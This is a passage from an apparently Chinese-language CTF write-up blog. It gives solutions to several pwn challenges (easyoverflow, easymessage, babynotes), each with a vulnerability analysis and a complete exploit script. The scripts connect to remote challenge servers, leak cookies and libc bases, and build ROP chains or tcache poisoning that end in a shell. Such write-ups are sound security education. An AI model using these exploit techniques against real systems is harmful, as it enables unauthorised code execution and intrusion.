class="title">edit_map</span><span class="params">(offset, val)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"7"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">"Value: "</span>, str(val))</span><br><span class="line"></span><br><span class="line">main_arean_offset = <span class="number">0x1d87a0</span></span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0x78</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"AAA\n"</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x38</span> - main_arean_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line">mmap(<span class="number">0</span>)</span><br><span class="line">offset = (__free_hook - <span class="number">0xE0000000</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">edit_map(offset, str(libc_system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">"/bin/sh\x00\n"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="easyoverflow"><a href="#easyoverflow" class="headerlink" title="easyoverflow"></a>easyoverflow</h1><p>比较简单的一个windows栈溢出，正好最近在学。</p>
<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><ol>
<li><p>首先栈溢出比较明显：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  --v10;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Dst, <span class="number">0</span>, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input:"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;Dst, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"buffer:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;Dst);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v10 &gt; <span class="number">0</span> );</span><br></pre></td></tr></table></figure>

<p> 也可以看出<code>SEH</code>和<code>SafeSEH</code>都没有，开了<code>GS</code>。</p>
</li>
<li><p>其次由于windows的ASLR机制与linux下不同，PIE base和dll base其低2 bytes均为0，而且在短时间内是不会变化的，也就是说第一次leak出来之后，后面可以直接用而不会因连接重置而重置；但是栈地址依然是随机的。</p>
</li>
<li><p>那么先统一把栈上面已有的<code>PIE</code>和<code>ntdll</code>上的库函数地址给leak出来，<code>PIE</code>用来return到<code>puts</code>上进行leak，（因为<code>puts</code>函数并不在<code>ntdll</code>里面，而<code>system</code>函数在<code>ucrtbase.dll</code>里面）。</p>
</li>
<li><p>至于这个栈上的<code>cookie</code>，从汇编代码中也可以看见：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF61C651000                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651002                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">130h</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651009                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">cs</span>:__security_cookie</span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651010                 <span class="keyword">xor</span>     <span class="built_in">rax</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C651013                 <span class="keyword">mov</span>     [<span class="built_in">rsp</span>+<span class="number">138h</span>+var_18], <span class="built_in">rax</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C6510B2                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, [<span class="built_in">rsp</span>+<span class="number">138h</span>+var_18]</span><br><span class="line"><span class="symbol">.text:</span>00007FF61C6510BA                 <span class="keyword">xor</span>     <span class="built_in">rcx</span>, <span class="built_in">rsp</span>        <span class="comment">; StackCookie</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF61C6510BD                 <span class="keyword">call</span>    __security_check_cookie</span><br></pre></td></tr></table></figure>

<p> 是先从binary的位置拿出<code>__security_cookie</code>的值，然后和<code>rsp</code>进行异或再写入栈上，退出时同样拿出栈上的<code>cookie</code>与<code>rsp</code>进行异或后再进行和<code>__security_cookie</code>的比较。因此如果<code>rsp</code>发生了变化，不能单纯地使用<code>cookie</code>来填充，而要leak出<code>__security_cookie</code>和<code>cookie</code>计算出<code>rsp</code>地值，再用<code>__security_cookie</code>和新的<code>rsp</code>异或得到新的<code>cookie</code>写入到栈上。</p>
</li>
<li><p>后续地就是利用<code>puts</code>将<code>read</code>地地址leak出来，然后计算出<code>ucrtbase</code>的加载地址从而计算出<code>system</code>和<code>cmd.exe</code>的地址，再用rop执行<code>system(&quot;cmd.txt&quot;)</code>，getshell后利用<code>type flag.txt</code>读flag。</p>
</li>
<li><p>exp（写得比较复杂，实际那些base地址在leak之后都可以直接用）：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./StackOverflow.exe")</span></span><br><span class="line"><span class="comment"># if len(sys.argv) == 2 and sys.argv[1] == '1':</span></span><br><span class="line"><span class="comment">#     windbgx.attach(p)</span></span><br><span class="line">    </span><br><span class="line">p = remote(<span class="string">'39.99.46.209'</span>, <span class="number">13389</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_rsi = <span class="number">0x000000000000cf23</span> <span class="comment"># pop rdi ; pop rsi ; ret</span></span><br><span class="line">pop_rcx = <span class="number">0x000000000009217b</span> <span class="comment"># pop rcx ; ret</span></span><br><span class="line">puts_gadget = <span class="number">0x10A6</span></span><br><span class="line">GS_offset = <span class="number">0x3008</span></span><br><span class="line">read_offset = <span class="number">0x2178</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\x0D\x0A"</span>)</span><br><span class="line">p.recv(<span class="number">0x100</span>)</span><br><span class="line">cookie = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = "A" * 0x118</span></span><br><span class="line"><span class="comment"># p.send(payload)</span></span><br><span class="line"><span class="comment"># p.recvuntil("buffer:")</span></span><br><span class="line"><span class="comment"># p.recvline()</span></span><br><span class="line"><span class="comment"># p.recv(0x118)</span></span><br><span class="line"><span class="comment"># PIE_base = u64(p.recv(6).ljust(8, '\x00')) - 0x12F4</span></span><br><span class="line"><span class="comment"># PIE_base =  0x7ff61c650000</span></span><br><span class="line">PIE_base =  <span class="number">0x7ff6fcba0000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x188</span></span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\x0D\x0A"</span>)</span><br><span class="line">p.recv(<span class="number">0x188</span>)</span><br><span class="line">ntdll_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x6A271</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(cookie)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(ntdll_base + pop_rcx) + p64(PIE_base + GS_offset)</span><br><span class="line">payload += p64(PIE_base + puts_gadget)</span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\r\n"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">GS = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">old_rsp = GS ^ cookie</span><br><span class="line">new_rsp = old_rsp + <span class="number">0x130</span> + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(GS ^ new_rsp)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(ntdll_base + pop_rcx) + p64(PIE_base + read_offset)</span><br><span class="line">payload += p64(PIE_base + puts_gadget)</span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"buffer:\x0D\x0A"</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ucrtbase_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x16270</span></span><br><span class="line">system = ucrtbase_base + <span class="number">0xABBA0</span></span><br><span class="line">cmd_exe = ucrtbase_base + <span class="number">0xCC9F0</span></span><br><span class="line"></span><br><span class="line">new_rsp += <span class="number">0x130</span> + <span class="number">0x20</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x100</span></span><br><span class="line">payload += p64(GS ^ new_rsp)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">8</span></span><br><span class="line">payload += p64(<span class="number">1</span>) <span class="comment"># rbx</span></span><br><span class="line">payload += p64(ntdll_base + pop_rcx) + p64(cmd_exe)</span><br><span class="line">payload += p64(ntdll_base + pop_rdi_rsi) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendafter(<span class="string">"input:\x0D\x0A"</span>, payload, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"[*] cookie: %s"</span> % hex(cookie))</span><br><span class="line">print(<span class="string">"[*] PIE_base: %s"</span> % hex(PIE_base))</span><br><span class="line">print(<span class="string">"[*] ntdll_base: %s"</span> % hex(ntdll_base))</span><br><span class="line">print(<span class="string">"[*] GS: %s"</span> % hex(GS))</span><br><span class="line">print(<span class="string">"[*] ucrtbase_base: %s"</span> % hex(ucrtbase_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="easymessage"><a href="#easymessage" class="headerlink" title="easymessage"></a>easymessage</h1><h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><ol>
<li><p>最开始的时候<code>Leave message</code>可以溢出<code>8 bytes</code>覆盖<code>rbp</code>，先输入<code>name</code>为一个大于<code>256</code>的值，然后利用溢出控制<code>rbp - 4</code>指向<code>bss</code>上<code>name</code>的内存区域：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400985</span>                 <span class="keyword">cmp</span>     [<span class="built_in">rbp</span>+var_4], <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040098C                 <span class="keyword">jle</span>     short loc_400995</span><br><span class="line"><span class="symbol">.text:</span>000000000040098E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_4], <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400995</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400995</span> loc_400995:                             <span class="comment">; CODE XREF: work+72↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400995</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">rbp</span>+var_4]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400998</span>                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040099A                 <span class="keyword">call</span>    leave_message</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二次<code>Leave message</code>就可以输入<code>0x100</code>的<code>payload</code>，直接写入<code>write</code>的gadgets来leak libc ，以及<code>read</code>的gadget来向<code>bss</code>上读入第二段<code>rop</code>，同时stack pivot到写入第二段<code>rop</code>的位置处</p>
</li>
<li><p>之后写入 system(“/bin/sh”) 的 gadget 即可。</p>
</li>
<li><p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">21342</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">'name: '</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span><span class="params">(message)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">'message: '</span>, message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'says: '</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">write_offset = libc.sym[<span class="string">'write'</span>]</span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x0000000000400646</span> <span class="comment"># ret</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400ac3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000400ac1</span> <span class="comment"># pop rsi ; pop r15 ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x0000000000400886</span> <span class="comment"># leave ; ret</span></span><br><span class="line">gadget_1 = <span class="number">0x400AA0</span></span><br><span class="line">gadget_2 = <span class="number">0x400AB6</span></span><br><span class="line">bss = elf.bss(<span class="number">0x600</span>)</span><br><span class="line"></span><br><span class="line">leave_name(<span class="string">"\x70"</span> * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x8</span> + p64(<span class="number">0x6010D0</span> + <span class="number">4</span>)</span><br><span class="line">leave_message(payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x8</span> + p64(<span class="number">0</span>)</span><br><span class="line">payload += flat([gadget_2, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">1</span>, write_got, <span class="number">0x8</span>])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss, <span class="number">0x200</span>])</span><br><span class="line">payload += flat([gadget_1, <span class="number">0</span>, <span class="number">0</span>, bss - <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">payload += flat([leave_ret])</span><br><span class="line">leave_message(payload)</span><br><span class="line">p.recvuntil(<span class="string">"done!\n\n"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">8</span>)) - write_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line">payload = flat([pop_rdi, str_bin_sh, pop_rsi, <span class="number">0</span>, <span class="number">0</span>, ret, libc_system])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400AA0 loc_400AA0:                             ; CODE XREF: __libc_csu_init+54↓j</span></span><br><span class="line"><span class="string">.text:0000000000400AA0                 mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:0000000000400AA3                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400AA6                 mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000400AA9                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000400AAD                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400AB1                 cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000400AB4                 jnz     short loc_400AA0</span></span><br><span class="line"><span class="string">.text:0000000000400AB6</span></span><br><span class="line"><span class="string">.text:0000000000400AB6 loc_400AB6:                             ; CODE XREF: __libc_csu_init+34↑j</span></span><br><span class="line"><span class="string">.text:0000000000400AB6                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:0000000000400ABA                 pop     rbx</span></span><br><span class="line"><span class="string">.text:0000000000400ABB                 pop     rbp</span></span><br><span class="line"><span class="string">.text:0000000000400ABC                 pop     r12</span></span><br><span class="line"><span class="string">.text:0000000000400ABE                 pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400AC0                 pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400AC2                 pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400AC4                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="babynotes"><a href="#babynotes" class="headerlink" title="babynotes"></a>babynotes</h1><h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><ol>
<li><p>reset 功能重新调用了一次 regist ，而 regist 中输入的 name 和 age 在 buffer 上连续，在 strcpy 的时候存在一次 heap overflow 的机会：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">regist</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  motto = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>uLL);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;s, <span class="number">0x18</span>uLL) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your motto: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;v3, <span class="number">0x20</span>uLL) == <span class="number">-1</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your age: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%lld"</span>, &amp;v2);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, &amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(motto, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3, <span class="number">0x20</span>uLL);</span><br><span class="line">  age = v2;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 可见age的位置在<code>strcpy(dest, &amp;s);</code>的时候也会同时被复制进去，因此可以覆盖下一个chunk的size。</p>
</li>
<li><p>利用 heap overflow 伪造 size ，形成 chunk overlap ，然后利用<code>show</code>leak出 libc 地址，再 tcache poisoning 打<code>__malloc_hook</code>为 onegadget 即可。</p>
</li>
<li><p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">43121</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regit</span><span class="params">(name, motto, age)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"Input your name: "</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">"Input your motto: "</span>, motto)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input your age: "</span>, str(age))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Input note size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Note "</span> + str(idx) + <span class="string">": 